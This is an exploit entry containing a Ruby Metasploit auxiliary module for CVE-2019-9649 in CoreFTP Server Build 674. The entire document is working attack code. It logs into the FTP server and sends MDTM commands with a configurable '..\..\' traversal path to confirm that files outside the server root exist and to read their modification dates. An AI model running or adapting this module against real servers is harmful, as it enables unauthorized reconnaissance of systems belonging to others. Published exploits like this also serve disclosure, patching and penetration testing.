Directory Traversal (Metasploit)
# Google Dork: N/A
# Date: 8/21/2019
# Exploit Author: Kevin Randall
# Vendor Homepage: https://www.coreftp.com
# Software Link: http://www.coreftp.com/server/index.html
# Version: Firmware: CoreFTP Server FTP / SFTP Server v2 - Build 674
# Tested on: Windows 7 and Windows XP
# CVE : CVE-2019-9649

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  def proto
     &#039;ftp&#039;
  end
  def initialize
    super(
      &#039;Name&#039; => &#039;CVE-2019-9649 CoreFTP FTP Server Version 674 and below
MDTM Directory Traversal&#039;,
      &#039;Description&#039; => %q{An issue was discovered in the SFTP Server
component in Core FTP 2.0 Build 674. Using the MDTM FTP command, a remote
attacker can use a directory traversal (..\..\) to browse outside the root
directory to determine the existence of a file on the operating system, and
the last mofidied date.},
      &#039;Author&#039; => [ &#039;Kevin Randall&#039; ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
           [ &#039;CVE&#039;, &#039;2019-9649&#039; ],
           [ &#039;BID&#039;, &#039;107449&#039; ],
           [ &#039;URL&#039;, &#039;
https://www.coreftp.com/forums/viewtopic.php?f=15&t=4022509&#039; ]
        ],
       &#039;Disclosure Date:&#039; =>  &#039;March 13 2019&#039;
    )
    register_options([
      Opt::RPORT(21),
      OptString.new(&#039;FILENAME&#039;, [true, "Name of file to search on remote
server", &#039;nslookup.exe&#039;] ),
      OptString.new(&#039;PATHTRAVERSAL&#039;, [true, "Traversal path Note: Default
Drive used is C: ", "\\..\\..\\..\\..\\"] ),
      OptString.new(&#039;PATHTOFILE&#039;, [ true, &#039;local filepath to the specified
file. Please add double slashes for escaping&#039;, &#039;Windows\\System32\\&#039;] )
    ])
  end
    def run_host(ip)
     print_status("Logging into FTP server now with supplied credentials")
     c = connect_login
     return if not c
     print_status("Performing exploitation of the MDTM command to enumerate
files")
     path = datastore[&#039;PATHTRAVERSAL&#039;] + datastore[&#039;PATHTOFILE&#039;] + "\\" +
datastore[&#039;FILENAME&#039;]
     res = send_cmd( [&#039;MDTM&#039;, "C: ", path ], true, nsock = self.sock)
     data = res.to_s
     print_status("Performing analysis.... Please wait")
     if (data.include? "213" )
             print_good ("And the circle hits the square!")
             print_good ("File Exists. Here is the last modified date for
the file:"+ data[4..-1])
       return res
     else
             print_error("Mission Failed We&#039;ll get them next time!")
             print_error ("Something went wrong or the file does not exist.
Please check your variables PATHTRAVERSAL and PATHTOFILE (please escape
double backslash) or verify file extension as it may be incorrect")
       return res
     end
   end
 end

